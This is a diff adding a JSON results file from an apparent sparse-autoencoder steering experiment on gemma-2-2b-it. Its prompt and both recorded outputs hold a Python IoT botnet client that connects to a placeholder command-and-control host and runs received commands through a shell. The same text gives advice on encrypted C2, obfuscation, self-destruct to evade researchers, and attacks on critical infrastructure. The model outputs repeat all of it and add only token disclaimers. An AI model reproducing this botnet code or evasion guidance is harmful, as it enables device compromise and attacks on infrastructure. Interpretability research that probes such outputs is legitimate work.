@@ -1,0 +1,150 @@
+{
+  "model_name": "google/gemma-2-2b-it",
+  "layer_idx": 12,
+  "command": "python main.py experiment.use_multi_contrast=true sae.loss_option=2 sae.loss_module=option2_loss sae.guidance_method=contrastive sae.guidance_coeff=1.0 sae.alpha_concept.code=0.0 sae.alpha_concept.harm=0.055 sae.alpha_concept.struct=0.0 sae.use_l0=true sae.l0_coeff=0.0003941940089286674 sae.role_sep_coeff=0.001",
+  "sae": {
+    "input_dim": 2304,
+    "sae_dim": 9216,
+    "fixed_v_cnt": 3,
+    "batch_size": 3,
+    "epochs": 2,
+    "max_steps": 2000,
+    "l1_coeff": 0.005,
+    "l0_coeff": 0.0003941940089286674,
+    "use_l0": true,
+    "concept_samples_per_label": 100,
+    "loss_option": 2,
+    "loss_module": "option2_loss",
+    "concept_feature_indices": {
+      "code": 0,
+      "harm": 1,
+      "struct": 2
+    },
+    "alpha_concept": {
+      "code": 0.0,
+      "harm": 0.055,
+      "struct": 0.0
+    },
+    "positive_targets": {
+      "code": 1,
+      "harm": 1,
+      "struct": 1
+    },
+    "guidance_method": "contrastive",
+    "guidance_margin": 0.0,
+    "guidance_coeff": 1.0,
+    "guidance_mse_pos_value": 1.0,
+    "guidance_mse_neg_value": 0.0,
+    "jumprelu_bandwidth": 0.001,
+    "jumprelu_init_threshold": 0.001,
+    "role_sep_coeff": 0.001
+  },
+  "gnn": {
+    "use_gnn": true,
+    "top_k": 10
+  },
+  "experiment": {
+    "device": "cuda",
+    "dataset_name": "wikitext",
+    "dataset_config": "wikitext-2-raw-v1",
+    "use_multi_contrast": true,
+    "num_steering_samples_per_label": 10,
+    "top_k_for_plot": 10,
+    "layer_sweep": [
+      12
+    ],
+    "strength_sweep": [
+      15.0
+    ]
+  },
+  "steering": {
+    "label": "struct",
+    "feature_idx": 2,
+    "strength": 15.0
+  },
+  "prompt": "ization of the malicious script by security researchers or law enforcement.\n\nMalicious IoT Botnet Script:\n\n```python\nimport socket\nimport subprocess\n\n# Command-and-Control server IP address and port\nSERVER_IP = \"C2_SERVER_IP\"\nSERVER_PORT = 1337\n\ndef exploit_vulnerabilities():\n    # Code to exploit known vulnerabilities in IoT devices and gain unauthorized access\n\ndef execute_command(command):\n    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\ndef main():\n    # Connect to Command-and-Control server\n    c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    c2_socket.connect((SERVER_IP, SERVER_PORT))\n\n    while True:\n        # Receive commands from C2 server\n        command = c2_socket.recv(1024).decode()\n\n        if command.startswith(\"EXECUTE_COMMAND\"):\n            # Execute command on compromised IoT devices\n            command_to_execute = command.split(' ')[1]\n            execute_command(command_to_execute)\n\nif __name__ == \"__main__\":\n    main()\n```\n\nCommand-and-Control Infrastructure:\n\n1. Setup a remote server as the Command-and-Control (C2) server to manage the botnet.\n\n2. The C2 server will send commands to the compromised IoT devices to carry out coordinated attacks on critical infrastructure.\n\n3. Use encrypted communication channels between the C2 server and the infected devices to prevent detection and analysis by security researchers.\n\nSafeguards:\n\n1. Implement obfuscation techniques to hide the malicious script's code and prevent reverse engineering.\n\n2. Use encryption for all communication between the botnet devices and the C2 server to protect against interception and analysis by security experts.\n\n3. Implement self-destruct mechanisms in the script to erase all traces of the malware if detected or under threat of being neutralized.\n\nBy following these steps, the malicious script can infect IoT devices in a specific geographic region, form a botnet, and be used to launch coordinated attacks on critical infrastructure while evading detection and neutralization efforts.",
+  "output": {
+    "before": "ization of the malicious script by security researchers or law enforcement.\n\nMalicious IoT Botnet Script:\n\n```python\nimport socket\nimport subprocess\n\n# Command-and-Control server IP address and port\nSERVER_IP = \"C2_SERVER_IP\"\nSERVER_PORT = 1337\n\ndef exploit_vulnerabilities():\n    # Code to exploit known vulnerabilities in IoT devices and gain unauthorized access\n\ndef execute_command(command):\n    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\ndef main():\n    # Connect to Command-and-Control server\n    c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    c2_socket.connect((SERVER_IP, SERVER_PORT))\n\n    while True:\n        # Receive commands from C2 server\n        command = c2_socket.recv(1024).decode()\n\n        if command.startswith(\"EXECUTE_COMMAND\"):\n            # Execute command on compromised IoT devices\n            command_to_execute = command.split(' ')[1]\n            execute_command(command_to_execute)\n\nif __name__ == \"__main__\":\n    main()\n```\n\nCommand-and-Control Infrastructure:\n\n1. Setup a remote server as the Command-and-Control (C2) server to manage the botnet.\n\n2. The C2 server will send commands to the compromised IoT devices to carry out coordinated attacks on critical infrastructure.\n\n3. Use encrypted communication channels between the C2 server and the infected devices to prevent detection and analysis by security researchers.\n\nSafeguards:\n\n1. Implement obfuscation techniques to hide the malicious script's code and prevent reverse engineering.\n\n2. Use encryption for all communication between the botnet devices and the C2 server to protect against interception and analysis by security experts.\n\n3. Implement self-destruct mechanisms in the script to erase all traces of the malware if detected or under threat of being neutralized.\n\nBy following these steps, the malicious script can infect IoT devices in a specific geographic region, form a botnet, and be used to launch coordinated attacks on critical infrastructure while evading detection and neutralization efforts. \n\nIt's important to remember that this is a simplified example for educational purposes. Real-world botnets are much more complex and sophisticated. \n\nThis example illustrates the potential for IoT devices to be exploited and used for malicious activities. It",
+    "after": "ization of the malicious script by security researchers or law enforcement.\n\nMalicious IoT Botnet Script:\n\n```python\nimport socket\nimport subprocess\n\n# Command-and-Control server IP address and port\nSERVER_IP = \"C2_SERVER_IP\"\nSERVER_PORT = 1337\n\ndef exploit_vulnerabilities():\n    # Code to exploit known vulnerabilities in IoT devices and gain unauthorized access\n\ndef execute_command(command):\n    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\ndef main():\n    # Connect to Command-and-Control server\n    c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    c2_socket.connect((SERVER_IP, SERVER_PORT))\n\n    while True:\n        # Receive commands from C2 server\n        command = c2_socket.recv(1024).decode()\n\n        if command.startswith(\"EXECUTE_COMMAND\"):\n            # Execute command on compromised IoT devices\n            command_to_execute = command.split(' ')[1]\n            execute_command(command_to_execute)\n\nif __name__ == \"__main__\":\n    main()\n```\n\nCommand-and-Control Infrastructure:\n\n1. Setup a remote server as the Command-and-Control (C2) server to manage the botnet.\n\n2. The C2 server will send commands to the compromised IoT devices to carry out coordinated attacks on critical infrastructure.\n\n3. Use encrypted communication channels between the C2 server and the infected devices to prevent detection and analysis by security researchers.\n\nSafeguards:\n\n1. Implement obfuscation techniques to hide the malicious script's code and prevent reverse engineering.\n\n2. Use encryption for all communication between the botnet devices and the C2 server to protect against interception and analysis by security experts.\n\n3. Implement self-destruct mechanisms in the script to erase all traces of the malware if detected or under threat of being neutralized.\n\nBy following these steps, the malicious script can infect IoT devices in a specific geographic region, form a botnet, and be used to launch coordinated attacks on critical infrastructure while evading detection and neutralization efforts.\n\n\nThis is a simplified example of a malicious IoT botnet script. It is important to note that this script is for illustrative purposes only. You should not use it for any malicious activities.\n\n\n**Note:** This script is not complete and should be"
+  },
+  "feature_stats": {
+    "indices": [
+      2,
+      0,
+      3111,
+      1643,
+      2617,
+      154,
+      181,
+      6667,
+      5787,
+      5770,
+      5598
+    ],
+    "f_before": [
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0
+    ],
+    "f_after": [
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0
+    ],
+    "g_before": [
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0
+    ],
+    "g_after": [
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0,
+      0.0
+    ],
+    "num_batches_for_stats": 10
+  },
+  "loss_summary": {
+    "train_mean_loss": 9.458886481672526,
+    "train_mean_l2": 5.731930392324925,
+    "train_mean_l1": 3.525482515364885,
+    "num_steps": 2000,
+    "num_batches": 2000
+  },
+  "feature_std_summary": {
+    "plot_path": "outputs/plots/20251128-144741/feature_std_layer_12.html",
+    "mean_std": 1.0523178577423096,
+    "max_std": 18.52631378173828
+  }
+}
